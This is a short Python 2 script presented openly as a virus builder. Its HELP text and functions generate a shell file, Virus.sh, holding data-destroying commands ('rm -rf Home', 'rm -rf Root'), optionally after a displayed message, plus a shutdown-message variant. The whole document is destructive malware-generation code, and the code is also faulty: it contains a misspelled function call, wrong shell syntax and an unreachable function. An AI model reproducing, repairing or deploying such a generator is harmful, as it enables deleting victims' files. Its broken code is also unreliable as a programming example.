import os
import time
#----------------------------------------------------------------------------------------------------------------------
def Dcreate_virus(parameter,message,text):
    if parameter == 1:
        if message == 1:
            D_Virus = open("Virus.sh", "wb")
            D_Virus.write("Echo " + text + os.linesep + "sleep -s 5" + os.linesep + "rm -rf Home");
            D_Virus.close()
            print "Successfully built.Press enter for exit"
            time.sleep(5) 
        if message == 2:
            D_Virus = open("Virus.sh", "wb")
            D_Virus.write("rm -rf Home");
            D_Virus.close()
            print "Successfully built.Press enter for exit"
            time.sleep(5)
    if parameter == 2:
        if message == 1:
            D_Virus = open("Virus.sh", "wb")
            D_Virus.write("Echo " + text + os.linesep + "sleep -s 5" + os.linesep + "rm -rf Root");
            D_Virus.close()
            print "Successfully built.Press enter for exit"
            time.sleep(5) 
        if message ==2:
            D_Virus = open("Virus.sh", "wb")
            D_Virus.write("rm -rf Root");
            D_Virus.close()
            print "Successfully built.Press enter for exit"
            time.sleep(5)
def Icreate_virus(text):
    I_Virus = open("Virus.sh", "wb")
    I_Virus.write("shutdown -k " + text)
    I_Virus.close()
    print "Successfully built.Press enter for exit"
    time.sleep(5)
#------------------------------------------------------------------------------------------------------------------
com = raw_input("AVC Ready {=> ")
if com == "Dcreate_virus":
    Dcreate_virus(1,2,"")
if com == "Dcreate_virus_text":
    text = raw_input("Message ~ ")
    Dcreate_virus(1,1,text)
if com == "D2create_virus":
    Dcrete_virus(2,2,"")
if com == "D2create_virus_text":
    text = raw_input("Message")
    Dcreate_virus(2,1,text)
if com == "HELP":
    print """
+-------------------------------------------------------------------------+
+Dcreate_virus_text  = Creates message virus who delete all personal data +
+Dcreate_virus       = Creates virus who delete all personal data         +
+D2create_virus_text = Create messages virus who deletes all root folder  +
+D2create_virus      = Create virus who deletes all root folder           +
+Icreate_virus       = Creates simple message and shutdown virus          +
+-------------------------------------------------------------------------+
"""
